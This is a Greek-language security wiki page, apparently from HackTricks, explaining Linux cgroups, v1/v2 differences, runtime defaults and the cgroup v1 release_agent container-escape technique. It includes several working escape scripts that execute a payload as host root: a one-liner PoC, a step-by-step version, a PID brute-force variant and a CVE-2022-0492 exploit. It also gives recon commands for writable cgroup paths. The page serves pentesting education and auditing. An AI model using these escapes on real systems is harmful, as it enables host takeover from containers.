# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Το Linux **control groups** είναι ο μηχανισμός του kernel που χρησιμοποιείται για να ομαδοποιεί διεργασίες για accounting, περιορισμούς, ιεράρχηση και επιβολή πολιτικών. Αν τα namespaces είναι κυρίως για την απομόνωση της όψης των πόρων, τα cgroups είναι κυρίως για τη διακυβέρνηση του **πόσο** από αυτούς τους πόρους μπορεί να καταναλώσει ένα σύνολο διεργασιών και, σε ορισμένες περιπτώσεις, **ποιες κατηγορίες πόρων** μπορούν καν να αλληλεπιδράσουν. Τα Containers βασίζονται συνεχώς στα cgroups, ακόμα και όταν ο χρήστης δεν τα βλέπει άμεσα, επειδή σχεδόν κάθε σύγχρονο runtime χρειάζεται έναν τρόπο να πει στον kernel "αυτές οι διεργασίες ανήκουν σε αυτό το workload, και αυτοί είναι οι κανόνες πόρων που ισχύουν για αυτές".

Γι' αυτό τα container engines τοποθετούν ένα νέο container στο δικό του cgroup subtree. Μόλις βρίσκεται εκεί το δέντρο διεργασιών, το runtime μπορεί να ορίσει όριο μνήμης, να περιορίσει τον αριθμό PIDs, να βαρύνει τη χρήση CPU, να ρυθμίσει το I/O και να περιορίσει την πρόσβαση σε συσκευές. Σε ένα production environment, αυτό είναι απαραίτητο τόσο για multi-tenant ασφάλεια όσο και για απλή επιχειρησιακή υγιεινή. Ένα container χωρίς ουσιαστικούς ελέγχους πόρων μπορεί να εξαντλήσει μνήμη, να πλημμυρίσει το σύστημα με διεργασίες ή να μονοπωλήσει CPU και I/O με τρόπους που καθιστούν τον host ή τα γειτονικά workloads μη σταθερά.

Από άποψη ασφάλειας, τα cgroups έχουν σημασία με δύο διακριτούς τρόπους. Πρώτον, κακοί ή απουσιάζοντες περιορισμοί πόρων επιτρέπουν ευθείες επιθέσεις denial-of-service. Δεύτερον, μερικά χαρακτηριστικά των cgroup, ειδικά σε παλαιότερες ρυθμίσεις **cgroup v1**, ιστορικά έχουν δημιουργήσει ισχυρά breakout primitives όταν ήταν εγγράψιμα από μέσα σε ένα container.

## v1 Vs v2

Υπάρχουν δύο κύρια μοντέλα cgroup στην πράξη. Το **cgroup v1** εκθέτει πολλαπλές ιεραρχίες controller, και παλαιότερα exploit writeups συχνά περιστρέφονται γύρω από τις παράξενες και μερικές φορές υπερβολικά ισχυρές σημασιολογίες που είναι διαθέσιμες εκεί. Το **cgroup v2** εισάγει μια πιο ενιαία ιεραρχία και γενικά καθαρότερη συμπεριφορά. Οι σύγχρονες διανομές προτιμούν όλο και περισσότερο το cgroup v2, αλλά υπάρχουν ακόμα μικτά ή legacy περιβάλλοντα, που σημαίνει ότι και τα δύο μοντέλα εξακολουθούν να είναι σχετικά όταν ελέγχει κανείς πραγματικά συστήματα.

Η διαφορά έχει σημασία γιατί μερικές από τις πιο διάσημες ιστορίες container breakout, όπως καταχρήσεις του **`release_agent`** στο cgroup v1, συνδέονται πολύ συγκεκριμένα με την παλαιότερη συμπεριφορά των cgroup. Ένας αναγνώστης που βλέπει ένα cgroup exploit σε ένα blog και στη συνέχεια το εφαρμόζει τυφλά σε ένα σύγχρονο σύστημα μόνο με cgroup v2 μάλλον θα παρεξηγήσει τι είναι πραγματικά δυνατόν στον στόχο.

## Inspection

Ο ταχύτερος τρόπος για να δείτε πού βρίσκεται το τρέχον shell σας είναι:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Το αρχείο `/proc/self/cgroup` δείχνει τις cgroup διαδρομές που σχετίζονται με την τρέχουσα διεργασία. Σε ένα σύγχρονο cgroup v2 σύστημα, συχνά θα δείτε μία ενιαία εγγραφή. Σε παλαιότερα ή υβριδικά συστήματα, μπορεί να δείτε πολλαπλές v1 controller διαδρομές. Μόλις γνωρίζετε τη διαδρομή, μπορείτε να ελέγξετε τα αντίστοιχα αρχεία στο `/sys/fs/cgroup` για να δείτε τα όρια και την τρέχουσα χρήση.

Σε ένα cgroup v2 σύστημα, οι ακόλουθες εντολές είναι χρήσιμες:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Αυτά τα αρχεία αποκαλύπτουν ποιοι controllers υπάρχουν και ποιοι έχουν ανατεθεί σε child cgroups. Αυτό το μοντέλο ανάθεσης έχει σημασία σε rootless και systemd-managed περιβάλλοντα, όπου το runtime ίσως να μπορεί να ελέγξει μόνο το υποσύνολο της λειτουργικότητας των cgroup που η γονική ιεραρχία πραγματικά εκχωρεί.

## Εργαστήριο

Ένας τρόπος να παρατηρήσετε τα cgroups στην πράξη είναι να τρέξετε ένα container με περιορισμένη μνήμη:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Μπορείτε επίσης να δοκιμάσετε ένα PID-limited container:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Αυτά τα παραδείγματα είναι χρήσιμα επειδή βοηθούν στη σύνδεση του runtime flag με το kernel file interface. Το runtime δεν επιβάλλει τον κανόνα με μαγεία· γράφει τις σχετικές ρυθμίσεις cgroup και στη συνέχεια αφήνει τον kernel να τις εφαρμόσει στο process tree.

## Runtime Usage

Docker, Podman, containerd, και CRI-O βασίζονται στα cgroups ως μέρος της κανονικής λειτουργίας. Οι διαφορές συνήθως δεν αφορούν το αν χρησιμοποιούν cgroups, αλλά **ποιες προεπιλογές επιλέγουν**, **πώς αλληλεπιδρούν με το systemd**, **πώς λειτουργεί η rootless delegation**, και **ποσοστό της διαμόρφωσης ελέγχεται σε επίπεδο engine έναντι επιπέδου orchestration**.

Σε Kubernetes, τα resource requests και limits τελικά γίνονται cgroup configuration στον node. Η διαδρομή από το Pod YAML μέχρι την επιβολή από τον kernel περνάει από το kubelet, το CRI runtime, και το OCI runtime, αλλά τα cgroups παραμένουν ο kernel μηχανισμός που τελικά εφαρμόζει τον κανόνα. Σε Incus/LXC περιβάλλοντα, τα cgroups χρησιμοποιούνται επίσης εκτενώς, ειδικά επειδή τα system containers συχνά εκθέτουν ένα πλουσιότερο process tree και λειτουργικές προσδοκίες πιο κοντά σε VM.

## Misconfigurations And Breakouts

Η κλασική ιστορία ασφαλείας των cgroup είναι ο εγγράψιμος μηχανισμός **cgroup v1 `release_agent`**. Σε αυτό το μοντέλο, αν ένας attacker μπορούσε να γράψει στα σωστά αρχεία cgroup, να ενεργοποιήσει `notify_on_release`, και να ελέγξει το path που αποθηκεύεται στο `release_agent`, ο kernel θα μπορούσε τελικά να εκτελέσει ένα path που επιλέγει ο attacker στα initial namespaces του host όταν το cgroup αδειάσει. Γι' αυτό τα παλαιότερα writeups δίνουν τόσο μεγάλη προσοχή στην εγγράψιμότητα των cgroup controllers, τις mount options, και τις συνθήκες namespace/capability.

Ακόμα και όταν το `release_agent` δεν είναι διαθέσιμο, τα λάθη στα cgroups εξακολουθούν να μετράνε. Η υπερβολικά ευρεία πρόσβαση σε devices μπορεί να κάνει host devices προσβάσιμα από το container. Η έλλειψη limits στη μνήμη και στα PID μπορεί να μετατρέψει μια απλή εκτέλεση κώδικα σε host DoS. Η αδύναμη cgroup delegation σε rootless σενάρια μπορεί επίσης να παραπλανήσει τους defenders, κάνοντάς τους να θεωρούν ότι υπάρχει ένας περιορισμός όταν το runtime ποτέ δεν ήταν πραγματικά σε θέση να τον εφαρμόσει.

### `release_agent` Background

Η τεχνική `release_agent` ισχύει μόνο για **cgroup v1**. Η βασική ιδέα είναι ότι όταν η τελευταία διεργασία σε ένα cgroup τερματίζει και `notify_on_release=1` είναι ενεργοποιημένο, ο kernel εκτελεί το πρόγραμμα του οποίου το path είναι αποθηκευμένο στο `release_agent`. Αυτή η εκτέλεση γίνεται στα **initial namespaces on the host**, και γι' αυτό ένα εγγράψιμο `release_agent` μετατρέπεται σε primitive για container escape.

Για να λειτουργήσει η τεχνική, ο attacker γενικά χρειάζεται:

- μια εγγράψιμη **cgroup v1** ιεραρχία
- τη δυνατότητα να δημιουργήσει ή να χρησιμοποιήσει ένα child cgroup
- τη δυνατότητα να θέσει `notify_on_release`
- τη δυνατότητα να γράψει ένα path στο `release_agent`
- ένα path που από την οπτική του host επιλύεται σε εκτελέσιμο

### Classic PoC

Το ιστορικό one-liner PoC είναι:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Αυτό το PoC γράφει μια διαδρομή payload στο `release_agent`, προκαλεί το cgroup release, και στη συνέχεια διαβάζει το αρχείο εξόδου που δημιουργήθηκε στον host.

### Αναγνώσιμο Βήμα-προς-Βήμα

Η ίδια ιδέα γίνεται πιο εύκολα κατανοητή όταν χωριστεί σε βήματα.

1. Δημιουργήστε και προετοιμάστε ένα εγγράψιμο cgroup:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Προσδιορίστε τη διαδρομή στο host που αντιστοιχεί στο filesystem του container:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Αποθέστε ένα payload που θα είναι ορατό από το host path:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Προκαλέστε την εκτέλεση κάνοντας το cgroup κενό:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Το αποτέλεσμα είναι εκτέλεση στην πλευρά του host του payload με host root privileges. Σε ένα πραγματικό exploit, το payload συνήθως γράφει ένα proof file, δημιουργεί ένα reverse shell, ή τροποποιεί την κατάσταση του host.

### Παραλλαγή Σχετικής Διαδρομής με χρήση του `/proc/<pid>/root`

Σε ορισμένα περιβάλλοντα, η host διαδρομή προς το container filesystem δεν είναι προφανής ή είναι κρυμμένη από τον storage driver. Σε αυτήν την περίπτωση, η διαδρομή του payload μπορεί να εκφραστεί μέσω του `/proc/<pid>/root/...`, όπου `<pid>` είναι ένα host PID που ανήκει σε μια διεργασία στο τρέχον container. Αυτή είναι η βάση της relative-path brute-force variant:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Το κρίσιμο κόλπο εδώ δεν είναι η ίδια η brute force αλλά η μορφή της διαδρομής: `/proc/<pid>/root/...` επιτρέπει στον kernel να επιλύσει ένα αρχείο μέσα στο container filesystem από το host namespace, ακόμη και όταν η άμεση διαδρομή αποθήκευσης του host δεν είναι γνωστή εκ των προτέρων.

### CVE-2022-0492 Παραλλαγή

Το 2022, το CVE-2022-0492 έδειξε ότι η εγγραφή στο `release_agent` σε cgroup v1 δεν ελεγχόταν σωστά για το `CAP_SYS_ADMIN` στο **initial** user namespace. Αυτό έκανε την τεχνική πολύ πιο προσιτή σε ευάλωτους kernels, επειδή μια διαδικασία μέσα σε container που μπορούσε να mount μια ιεραρχία cgroup μπορούσε να γράψει στο `release_agent` χωρίς να έχει ήδη προνόμια στο host user namespace.

Ελάχιστο exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Σε έναν ευάλωτο kernel, ο host εκτελεί το `/proc/self/exe` με δικαιώματα root του host.

Για πρακτική εκμετάλλευση, ξεκινήστε ελέγχοντας εάν το περιβάλλον εξακολουθεί να εκθέτει εγγράψιμες cgroup-v1 paths ή επικίνδυνη πρόσβαση σε συσκευές:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Αν το `release_agent` υπάρχει και είναι εγγράψιμο, βρίσκεστε ήδη σε περιοχή legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Εάν η ίδια η διαδρομή cgroup δεν οδηγεί σε escape, η επόμενη πρακτική χρήση είναι συχνά denial of service ή reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Αυτές οι εντολές σας λένε γρήγορα αν το workload έχει περιθώριο να εκτελέσει fork-bomb, να καταναλώσει μνήμη επιθετικά, ή να καταχραστεί ένα εγγράψιμο παλαιού τύπου cgroup interface.

## Έλεγχοι

Κατά τον έλεγχο ενός στόχου, ο σκοπός των ελέγχων cgroup είναι να προσδιορίσετε ποιο μοντέλο cgroup χρησιμοποιείται, αν το container βλέπει εγγράψιμες διαδρομές controller, και αν παλιές breakout primitives όπως το `release_agent` είναι ακόμη σχετικές.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Τι είναι ενδιαφέρον εδώ:

- Αν `mount | grep cgroup` δείχνει **cgroup v1**, παλαιότερα breakout writeups γίνονται πιο σχετικά.
- Αν το `release_agent` υπάρχει και είναι προσβάσιμο, αξίζει άμεση και βαθύτερη διερεύνηση.
- Αν η ορατή ιεραρχία cgroup είναι εγγράψιμη και το container έχει επίσης ισχυρές capabilities, το περιβάλλον απαιτεί πολύ πιο προσεκτική ανασκόπηση.

Αν ανακαλύψετε **cgroup v1**, writable controller mounts, και ένα container που επίσης έχει ισχυρές capabilities ή αδύναμη προστασία seccomp/AppArmor, ο συνδυασμός αυτός αξίζει προσεκτική προσοχή. Τα cgroups συχνά αντιμετωπίζονται ως ένα βαρετό θέμα διαχείρισης πόρων, αλλά ιστορικά έχουν αποτελέσει μέρος μερικών από τις πιο διδακτικές container escape chains, ακριβώς επειδή το όριο μεταξύ "resource control" και "host influence" δεν ήταν πάντα τόσο καθαρό όσο πολλοί υποθέτουν.

## Προεπιλογές Runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Ενεργοποιημένο από προεπιλογή | Τα containers τοποθετούνται σε cgroups αυτόματα· τα όρια πόρων είναι προαιρετικά εκτός αν οριστούν με flags | παραλείποντας `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Ενεργοποιημένο από προεπιλογή | `--cgroups=enabled` είναι η προεπιλογή· οι προεπιλογές του cgroup namespace ποικίλλουν ανάλογα με την έκδοση cgroup (`private` στο cgroup v2, `host` σε μερικές εγκαταστάσεις cgroup v1) | `--cgroups=disabled`, `--cgroupns=host`, χαλαρή πρόσβαση σε συσκευές, `--privileged` |
| Kubernetes | Ενεργοποιημένο μέσω του runtime από προεπιλογή | Τα Pods και τα containers τοποθετούνται σε cgroups από το runtime του node· ο λεπτομερής έλεγχος πόρων εξαρτάται από `resources.requests` / `resources.limits` | παράλειψη resource requests/limits, προνομιακή πρόσβαση σε συσκευές, λανθασμένη διαμόρφωση runtime σε επίπεδο host |
| containerd / CRI-O | Ενεργοποιημένο από προεπιλογή | Τα cgroups είναι μέρος της κανονικής διαχείρισης κύκλου ζωής | άμεσες ρυθμίσεις runtime που χαλαρώνουν τους ελέγχους συσκευών ή εκθέτουν legacy writable cgroup v1 interfaces |

Η σημαντική διάκριση είναι ότι η ύπαρξη των **cgroup** είναι συνήθως προεπιλογή, ενώ οι **χρήσιμοι περιορισμοί πόρων** είναι συχνά προαιρετικοί εκτός εάν ρυθμιστούν ρητά.
